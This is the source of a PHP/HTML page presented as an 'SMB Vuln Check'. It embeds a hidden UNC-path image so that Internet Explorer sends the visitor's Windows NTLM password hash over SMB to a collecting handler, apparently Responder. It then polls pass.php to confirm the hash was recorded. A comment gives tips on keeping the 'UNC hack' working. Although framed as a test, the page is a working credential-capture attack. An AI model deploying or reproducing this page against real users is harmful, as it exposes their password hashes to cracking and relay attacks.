<?php

require_once('config.php');

?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
  <title>SMB Vuln Check</title>
<script src="jquery-1.11.0.min.js" type="text/javascript"></script>
<script type="text/javascript">


/*
function photoLoaded()
Continuously checks if #test has loaded(404'd) and sets 
isPhotoLoaded to "true" if it has
*/
function photoLoaded() {
    var isPhotoLoaded = false;
    $("#test").each(function() {
        if (this.naturalWidth === 0 || this.naturalHeight === 0 || this.complete === false) {
            isPhotoLoaded = true;
        }
    });
    return isPhotoLoaded;
}

/*
function checkVuln()
uses an ajax request to call out to the responder.py handler and
ask if the unique filename of the #test image has been seen
by the handler. If it has been seen we know that the SMB request
to the handler was successful and that the hashes have likely been
recorded.

If the filename has been seen(1 returned) the vulnerable messages
are displayed. If the filename has not been seen(0 returned) the not
vulnerable messages are displayed.
*/
function checkVuln() {
    $.get( "pass.php", { name: <?php echo '"' . $name . '.' . $extension . '"' ?> } )
        .done(function(data){
            if (data == "1") {
                $('#vuln').css("display","block");
                $('#extravuln').css("display","block");
            }
            else if (data == "0") {
                $('#notvuln').css("display","block");
            }
        });

}


/*
function fireVulnTest()
Called continuously every 250ms. Starts 500ms after the page 
has finished loading. Uses photoLoaded to determine if #test 
has finished loading. If #test has finished loading it fires
checkVuln to detect if the hashes were passed out.
*/
function fireVulnTest() {
    var isPhotoLoaded = photoLoaded();
    if(!isPhotoLoaded)
    {
        setTimeout(fireVulnTest, 250);
        return;
    }
    else
    {
        checkVuln();
    }
}

$(document).ready(function(){
    setTimeout(fireVulnTest, 500);
});

</script>

<style>
p {
    font-family: Verdana, serif;
}

#notvuln {
    display:none;
    font-family: Verdana, serif;
    text-align: center;
    font-weight: bold;
    font-size: 72px;
    color:#33AA33;
}

#vuln {
    display:none;
    font-family: Verdana, serif;
    text-align: center;
    font-weight: bold;
    font-size: 72px;
    color:#AA3333;
}

#extravuln {
    display:none;
    font-family: Verdana, serif;
    text-align: center;
    font-weight: bold;
    font-size: 32px;
    color:#AA3333;
}

</style>

</head>
<body>
<p>When accessed from Internet Explorer, this page attempts to abuse UNC path functionality to automatically obtain user credentials.</p>
<p>The code in use is shown below:</p>
<pre>
    &lt;img src=<?php echo $imgsrc; ?> style="display:none" width="0" height="0" /&gt;
</pre>
<!--
ATTENTION MODDERS

USING "onerror" or "onload" ATTRIBUTES BREAKS THE UNC HACK
USING JQUERY TO CONSTRUCT AND APPEND THE IMAGE BREAKS THE UNC HACK
YOURE WELCOME
-->
<img id="test" src=<?php echo $imgsrc; ?> style="display:none" width="0" height="0" />

<h1 id="notvuln">You are not vulnerable.</h1>
<h1 id="vuln">You are VULNERABLE.</h1>
<h3 id="extravuln">Your browser just passed a hash of your<br/>windows password over the Internet.<br/>Please make the necessary firewall rule modifications.</h3>
</body>
</html>
